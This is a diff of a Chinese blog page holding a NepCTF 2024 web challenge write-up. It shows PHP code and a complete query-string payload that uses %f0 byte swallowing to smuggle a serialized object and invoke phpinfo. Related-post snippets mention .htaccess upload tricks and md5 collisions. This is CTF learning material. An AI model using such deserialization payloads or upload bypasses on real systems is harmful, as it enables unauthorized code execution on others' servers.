@@ -265,7 +265,7 @@
 
 	<a href="/2024/08/25/NepCTF2024%E9%83%A8%E5%88%86web/" itemprop="url">
 		<time datetime="2024-08-25T10:27:51.000Z" itemprop="dateUpdated">
-	  		2024-08-27
+	  		2024-08-28
 	  </time>
 	</a> 
 
@@ -309,7 +309,7 @@
 
 		<div class="article-content" id="article-content">
 			<h1 id="NepDouble"><a href="#NepDouble" class="headerlink" title="NepDouble"></a>NepDouble</h1><p>代码过长这里不贴了，看到上传压缩包的第一反应是做一个链接到&#x2F;flag的软连接，上传上去解压就可以看到flag了，但是这里</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if os.path.islink(new_file):</span><br><span class="line">    return &#x27;Symbolic links are not allowed.&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> os.path.islink(new_file):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Symbolic links are not allowed.&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <p>把软连接给ban了，就不能通过文件上传来解决问题了。</p>
 <p>我们注意文件上传的这一段代码：</p>
@@ -368,7 +368,8 @@
 
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\[|\]/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;nep&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NONONO!!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$str</span> = <span class="title function_ invoke__">substrstr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nep1&#x27;</span>].<span class="string">&quot;[welcome to&quot;</span>. <span class="variable">$_GET</span>[<span class="string">&#x27;nep&#x27;</span>].<span class="string">&quot;CTF]&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$str</span>===<span class="string">&#x27;NepCTF]&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;b) ();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
 
-<p>关于这里面的逃逸，大家可以去看<a target="_blank" rel="noopener" href="https://www.cnblogs.com/EddieMurphy-blogs/p/18310518%E8%BF%99%E9%87%8C%E4%B8%8D%E5%86%8D%E8%B5%98%E8%BF%B0%E4%BA%86%E3%80%82%E4%B8%BB%E8%A6%81%E6%98%AF%E6%B3%A8%E6%84%8F%E4%B8%80%E4%B8%8B%f0%E5%90%9E%E5%AD%97%E7%AC%A6%E7%9A%84%E5%8F%96%E6%95%B4%E3%80%82">https://www.cnblogs.com/EddieMurphy-blogs/p/18310518这里不再赘述了。主要是注意一下%f0吞字符的取整。</a></p>
+<p>关于这里面的逃逸，大家可以去看 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/EddieMurphy-blogs/p/18310518">https://www.cnblogs.com/EddieMurphy-blogs/p/18310518</a></p>
+<p>这里不再赘述了。主要是注意一下%f0吞字符的取整。</p>
 <p>总payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;&amp;nep1=%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0%f0&amp;nep=NepCTNep</span><br></pre></td></tr></table></figure>
 
@@ -391,6 +392,10 @@
 	<span>
 		<a id="totop-post-page">返回顶部</a>
 		
+			<a href="/2024/09/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AFweb%E5%85%A8%E9%A2%98%E8%A7%A3/" title="第四届长城杯web全题解" rel="prev">
+				&laquo;上一篇
+			</a>
+		
 		
 			<a href="/2024/08/25/2024%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E9%83%A8%E5%88%86wp/" title="2024第七届巅峰极客部分wp" rel="next">
 				下一篇&raquo;
@@ -410,6 +415,41 @@
 <div class="relate-post">
 	
 		<ul>
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/09/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AFweb%E5%85%A8%E9%A2%98%E8%A7%A3/" title="第四届长城杯web全题解">
+								第四届长城杯web全题解			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								九月 8日, 2024				
+							</p>
+							<p class="relate-post-content">
+								WEB
+SQLUS
+
+
+
+猜测账户是admin密码是任意一个字符
+登录进去后头像那边，可以上传文件，但是文件名里不能有p，尝试传入.htaccess然后传入一个txt当做php执行。
+
+
+
+在头像前端看到了上传路径
+
+
+flag没有权...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/09/08/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AFweb%E5%85%A8%E9%A2%98%E8%A7%A3/" title="第四届长城杯web全题解">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/第四届长城杯/ccb.png" alt="第四届长城杯web全题解"/>
+							</a>
+						</div>
+					</li>												
 			
 					<li>
 						<div class="relate-post-text">
@@ -639,32 +679,6 @@ Master of Profile参考链接：https://cn-sec.com/archives/2105254.html想读�
 							<a href="/2024/03/19/DubheCTF-2024/" title="DubheCTF_2024">				
 								
 								<img class="lazy" src="/img/lazy.gif" data-src="/img/background/28.jpg" alt="DubheCTF_2024"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/02/29/%E9%9D%92%E5%B0%91%E5%B9%B4ctf-2024/" title="青少年ctf 2024">
-								青少年ctf 2024			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								二月 29日, 2024				
-							</p>
-							<p class="relate-post-content">
-								by:Infernity
-Easy md5需要我们上传两个md5相同的PDF文件。
-新建一个空白PDF文件，拖到fastcoll里得到另外两个pdf文件，上传进去得到flag。
-php的后门是php 8.1dev版本漏洞
-https:...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/02/29/%E9%9D%92%E5%B0%91%E5%B9%B4ctf-2024/" title="青少年ctf 2024">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/background/3.jpg" alt="青少年ctf 2024"/>
 							</a>
 						</div>
 					</li>												
